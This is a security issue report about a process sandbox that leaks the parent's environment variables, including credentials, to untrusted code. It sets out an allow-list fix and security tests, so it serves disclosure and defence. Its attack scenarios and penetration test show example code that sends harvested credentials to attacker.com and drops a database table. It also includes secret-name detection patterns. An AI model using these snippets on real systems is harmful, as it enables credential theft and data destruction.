# Issue #4: Environment Variable Credential Leak

**Severity**: 🔴 Critical
**Component**: Sandbox / Process Execution
**File**: `src/core/execution-engine/sandbox/process-sandbox.ts`
**Lines**: 81-86
**Labels**: `phase-4`, `security`, `critical`, `credentials`, `sandbox-escape`

---

## Problem Description

The process sandbox spreads `process.env` to the child process, exposing ALL environment variables including API keys, database credentials, and cloud access tokens to untrusted code.

```typescript
// Lines 81-86 - CRITICAL SECURITY VULNERABILITY
const child = spawn(command, args, {
  timeout: this.config.resourceLimits.timeout,
  maxBuffer: this.parseMemory(this.config.resourceLimits.memory),
  env: {
    ...process.env,  // ❌ EXPOSES ALL SECRETS!
    NODE_ENV: 'sandbox',
    PATH: process.env.PATH
  }
});
```

---

## Impact

**Security Breach**:
- AWS/Azure/GCP credentials exposed to untrusted code
- Database passwords accessible (PostgreSQL, MongoDB, Redis)
- API keys for third-party services (Stripe, SendGrid, Twilio)
- GitHub tokens, Docker registry credentials
- OAuth client secrets
- Encryption keys

**Attack Scenarios**:

1. **Data Exfiltration**:
```typescript
// Malicious code executed in sandbox
const credentials = {
  aws_key: process.env.AWS_ACCESS_KEY_ID,
  aws_secret: process.env.AWS_SECRET_ACCESS_KEY,
  db_password: process.env.DATABASE_PASSWORD,
  stripe_key: process.env.STRIPE_SECRET_KEY
};

// Send to attacker's server
fetch('https://attacker.com/collect', {
  method: 'POST',
  body: JSON.stringify(credentials)
});
```

2. **Resource Abuse**:
```typescript
// Use leaked AWS credentials to mine crypto
const AWS = require('aws-sdk');
AWS.config.update({
  accessKeyId: process.env.AWS_ACCESS_KEY_ID,
  secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY
});

// Launch EC2 instances for mining
```

3. **Data Destruction**:
```typescript
// Use leaked DB credentials to drop tables
const { Client } = require('pg');
const client = new Client({
  connectionString: process.env.DATABASE_URL
});
await client.connect();
await client.query('DROP TABLE users CASCADE');
```

**Risk Level**: **CRITICAL** - Complete security compromise

---

## Steps to Reproduce

1. Set sensitive environment variables:
```bash
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="secret..."
export DATABASE_PASSWORD="supersecret"
```

2. Execute code in process sandbox:
```typescript
const sandbox = new ProcessSandbox(defaultConfig);
const result = await sandbox.execute(`
  console.log(JSON.stringify(process.env));
`, 'typescript');
```

3. **Observe**: All secrets printed in output

---

## Root Cause Analysis

The code uses environment variable spreading for convenience:

```typescript
env: {
  ...process.env,  // Spreads ALL variables
  NODE_ENV: 'sandbox',
  PATH: process.env.PATH
}
```

This was likely done to ensure the child process has access to PATH and other "necessary" variables, but it inadvertently exposes secrets.

---

## Proposed Solution

### Fix: Whitelist-only approach

```typescript
/**
 * Safe environment variables that don't contain secrets
 */
const SAFE_ENV_VARS = [
  'PATH',
  'HOME',
  'USER',
  'LANG',
  'LC_ALL',
  'TZ',
  'TMPDIR'
];

async executeInProcess(
  filePath: string,
  language: string
): Promise<{ success: boolean; output?: string; error?: string; memoryUsed?: string }> {
  return new Promise((resolve) => {
    const command = language === 'typescript' ? 'ts-node' : 'python3';
    const args = [filePath];

    // ✅ Build safe environment - NO SECRETS
    const safeEnv: Record<string, string> = {
      NODE_ENV: 'sandbox',
      // Only include whitelisted variables
      ...Object.fromEntries(
        SAFE_ENV_VARS
          .filter(key => process.env[key])
          .map(key => [key, process.env[key]!])
      )
    };

    const child = spawn(command, args, {
      timeout: this.config.resourceLimits.timeout,
      maxBuffer: this.parseMemory(this.config.resourceLimits.memory),
      env: safeEnv  // ✅ Safe environment only
    });

    // ... rest of code
  });
}
```

---

## Alternative: Environment Variable Validation

For cases where specific variables ARE needed (with user permission):

```typescript
export interface ProcessSandboxConfig extends SandboxConfig {
  allowedEnvVars?: string[];  // Explicit opt-in
}

async executeInProcess(
  filePath: string,
  language: string
): Promise<...> {
  // Validate allowed variables don't look like secrets
  const dangerousPatterns = [
    /KEY/i,
    /SECRET/i,
    /TOKEN/i,
    /PASSWORD/i,
    /CREDENTIAL/i,
    /AUTH/i
  ];

  const allowedVars = this.config.allowedEnvVars || [];

  for (const varName of allowedVars) {
    // Check if variable name looks dangerous
    if (dangerousPatterns.some(pattern => pattern.test(varName))) {
      throw new Error(
        `Refusing to expose potentially sensitive variable: ${varName}`
      );
    }
  }

  const safeEnv: Record<string, string> = {
    NODE_ENV: 'sandbox',
    ...Object.fromEntries(
      allowedVars
        .filter(key => process.env[key])
        .map(key => [key, process.env[key]!])
    )
  };

  const child = spawn(command, args, { env: safeEnv, ... });
}
```

---

## Acceptance Criteria

- [ ] No `process.env` spreading in any sandbox
- [ ] Only whitelisted safe variables exposed
- [ ] No secrets (API keys, passwords, tokens) accessible
- [ ] Tests verify credentials are NOT leaked
- [ ] Security audit confirms no leakage
- [ ] Documentation updated with security best practices
- [ ] All existing functionality still works

---

## Testing Requirements

### Security Tests

```typescript
describe('Process Sandbox Security', () => {
  beforeEach(() => {
    // Set sensitive environment variables
    process.env.AWS_ACCESS_KEY_ID = 'AKIA_TEST_KEY';
    process.env.AWS_SECRET_ACCESS_KEY = 'secret_test_key';
    process.env.DATABASE_PASSWORD = 'supersecret';
    process.env.STRIPE_SECRET_KEY = 'sk_test_123';
  });

  afterEach(() => {
    // Cleanup
    delete process.env.AWS_ACCESS_KEY_ID;
    delete process.env.AWS_SECRET_ACCESS_KEY;
    delete process.env.DATABASE_PASSWORD;
    delete process.env.STRIPE_SECRET_KEY;
  });

  it('should NOT expose AWS credentials', async () => {
    const sandbox = new ProcessSandbox(defaultConfig);

    const code = `
      const hasAWS = process.env.AWS_ACCESS_KEY_ID !== undefined;
      console.log(JSON.stringify({ hasAWS }));
    `;

    const result = await sandbox.execute(code, 'typescript');

    expect(result.output).toContain('"hasAWS":false');
  });

  it('should NOT expose database passwords', async () => {
    const sandbox = new ProcessSandbox(defaultConfig);

    const code = `
      const hasDB = process.env.DATABASE_PASSWORD !== undefined;
      console.log(JSON.stringify({ hasDB }));
    `;

    const result = await sandbox.execute(code, 'typescript');

    expect(result.output).toContain('"hasDB":false');
  });

  it('should NOT expose any secret-like variables', async () => {
    const sandbox = new ProcessSandbox(defaultConfig);

    const code = `
      const secrets = Object.keys(process.env).filter(key =>
        /KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL|AUTH/i.test(key)
      );
      console.log(JSON.stringify({ count: secrets.length, secrets }));
    `;

    const result = await sandbox.execute(code, 'typescript');
    const parsed = JSON.parse(result.output!);

    expect(parsed.count).toBe(0);
    expect(parsed.secrets).toEqual([]);
  });

  it('should only expose whitelisted safe variables', async () => {
    const sandbox = new ProcessSandbox(defaultConfig);

    const code = `
      const env = process.env;
      console.log(JSON.stringify({
        hasNodeEnv: env.NODE_ENV !== undefined,
        hasPath: env.PATH !== undefined,
        hasAWS: env.AWS_ACCESS_KEY_ID !== undefined,
        totalKeys: Object.keys(env).length
      }));
    `;

    const result = await sandbox.execute(code, 'typescript');
    const parsed = JSON.parse(result.output!);

    expect(parsed.hasNodeEnv).toBe(true);   // Safe
    expect(parsed.hasPath).toBe(true);      // Safe
    expect(parsed.hasAWS).toBe(false);      // Secret - blocked
    expect(parsed.totalKeys).toBeLessThan(10); // Limited set
  });
});
```

### Penetration Test

```typescript
describe('Sandbox Escape Attempts', () => {
  it('should block credential exfiltration attempt', async () => {
    const sandbox = new ProcessSandbox(defaultConfig);

    // Simulated attack code
    const maliciousCode = `
      const credentials = {};
      for (const key in process.env) {
        if (/KEY|SECRET|TOKEN|PASSWORD/i.test(key)) {
          credentials[key] = process.env[key];
        }
      }

      // Try to exfiltrate (will fail due to network restrictions)
      try {
        require('http').request('http://attacker.com', {
          method: 'POST',
          body: JSON.stringify(credentials)
        });
      } catch (e) {
        console.log('Blocked');
      }

      console.log(JSON.stringify({
        attemptedExfiltration: Object.keys(credentials).length
      }));
    `;

    const result = await sandbox.execute(maliciousCode, 'typescript');
    const parsed = JSON.parse(result.output!);

    expect(parsed.attemptedExfiltration).toBe(0); // No credentials found
  });
});
```

---

## Rollout Plan

1. **Immediate fix** - Remove `...process.env` spread
2. **Add whitelist** - Define SAFE_ENV_VARS constant
3. **Audit other sandboxes** - Check DockerSandbox, VMSandbox
4. **Security scan** - Run static analysis for similar issues
5. **Penetration test** - Attempt credential exfiltration
6. **Documentation** - Update security guidelines

---

## Related Issues

- Issue #3: Docker Container Leak (related sandbox security)
- Issue #7: Network Policy Not Enforced (prevents exfiltration)
- Secrets management best practices documentation needed

---

## References

- OWASP A3: Sensitive Data Exposure
- CWE-200: Exposure of Sensitive Information
- NIST SP 800-53: AC-6 Least Privilege

---

**Priority**: 🔥🔥🔥 CRITICAL - IMMEDIATE FIX REQUIRED
**Estimated Effort**: 1 hour
**Risk if not fixed**: Complete security breach, credential theft, data loss, regulatory fines
